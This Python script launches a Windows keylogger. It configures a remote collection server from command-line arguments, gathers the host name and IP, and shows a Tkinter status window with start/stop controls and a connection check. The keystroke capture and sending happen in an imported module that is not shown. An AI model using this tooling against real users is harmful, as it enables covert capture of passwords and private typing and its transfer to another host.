from keylogger.windows_keylogger import KeyLogger
import sys
import os
import socket
import json
import time
import logging
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
import threading

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def get_computer_info():
    """Get basic computer information"""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return {
            'hostname': hostname,
            'ip': ip,
            'os': 'Windows'
        }
    except Exception as e:
        logger.error(f"Error getting computer info: {e}")
        return {
            'hostname': 'Unknown',
            'ip': 'Unknown',
            'os': 'Windows'
        }

def test_server_connection(host, port):
    """Test connection to server"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((host, port))
            return True
    except Exception as e:
        logger.error(f"Connection test failed: {e}")
        return False

def show_status_window():
    """Create a status window to show the keylogger is running"""
    root = tk.Tk()
    root.title("KeyLogger Status")
    root.geometry("400x300")
    
    # Make window stay on top
    root.attributes('-topmost', True)
    
    # Add status label
    status_label = tk.Label(root, text="KeyLogger is running", font=("Arial", 12, "bold"))
    status_label.pack(pady=10)
    
    # Add device info
    device_label = tk.Label(root, text=f"Device ID: {device_id}", font=("Arial", 10))
    device_label.pack(pady=5)
    
    # Add server info
    server_label = tk.Label(root, text=f"Server: {server_host}:{server_port}", font=("Arial", 10))
    server_label.pack(pady=5)
    
    # Add connection status with a frame
    connection_frame = tk.Frame(root, bd=2, relief=tk.GROOVE)
    connection_frame.pack(pady=10, padx=10, fill=tk.X)
    
    connection_title = tk.Label(connection_frame, text="Connection Status:", font=("Arial", 10, "bold"))
    connection_title.pack(pady=5)
    
    connection_label = tk.Label(connection_frame, text="Testing connection...", font=("Arial", 12))
    connection_label.pack(pady=5)
    
    # Add control buttons
    button_frame = tk.Frame(root)
    button_frame.pack(pady=10)
    
    def start_logging():
        if not test_server_connection(server_host, server_port):
            messagebox.showerror("Error", "Cannot connect to server!")
            return
        result = keylogger.start_logging(device_id)
        if "successfully" in result.lower():
            status_label.config(text="KeyLogger is running", fg="green")
            start_button.config(state=tk.DISABLED)
            stop_button.config(state=tk.NORMAL)
        else:
            messagebox.showerror("Error", f"Failed to start: {result}")
    
    def stop_logging():
        result = keylogger.stop_logging()
        if "successfully" in result.lower():
            status_label.config(text="KeyLogger is stopped", fg="red")
            start_button.config(state=tk.NORMAL)
            stop_button.config(state=tk.DISABLED)
        else:
            messagebox.showerror("Error", f"Failed to stop: {result}")
    
    start_button = tk.Button(button_frame, text="Start Logging", command=start_logging, 
                           font=("Arial", 10), bg="green", fg="white", width=15)
    start_button.pack(side=tk.LEFT, padx=5)
    
    stop_button = tk.Button(button_frame, text="Stop Logging", command=stop_logging,
                          font=("Arial", 10), bg="red", fg="white", width=15, state=tk.DISABLED)
    stop_button.pack(side=tk.LEFT, padx=5)
    
    def update_connection_status():
        while True:
            if test_server_connection(server_host, server_port):
                connection_label.config(text="CONNECTED TO SERVER", fg="green", font=("Arial", 12, "bold"))
            else:
                connection_label.config(text="NOT CONNECTED TO SERVER", fg="red", font=("Arial", 12, "bold"))
            time.sleep(5)
    
    # Start connection status update thread
    threading.Thread(target=update_connection_status, daemon=True).start()
    
    return root

def main():
    global device_id, server_host, server_port, keylogger
    
    # Default server settings (can be overridden by command line args)
    server_host = "localhost"
    server_port = 12345
    
    # Parse command line arguments
    if len(sys.argv) > 1:
        server_host = sys.argv[1]
    if len(sys.argv) > 2:
        server_port = int(sys.argv[2])
    
    # Generate a unique device ID
    device_id = f"WIN-{socket.gethostname()}-{datetime.now().strftime('%Y%m%d%H%M%S')}"
    
    # Get computer info
    computer_info = get_computer_info()
    
    print(f"Starting keylogger for device: {device_id}")
    print(f"Connecting to server: {server_host}:{server_port}")
    
    # Initialize keylogger with remote server settings
    keylogger = KeyLogger(
        db_path="local_backup.db",  # Local backup in case server is unreachable
        remote_host=server_host,
        remote_port=server_port
    )
    
    # Show status window
    root = show_status_window()
    
    try:
        # Start the GUI main loop
        root.mainloop()
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        print(keylogger.stop_logging())
        root.destroy()

if __name__ == "__main__":
    main() 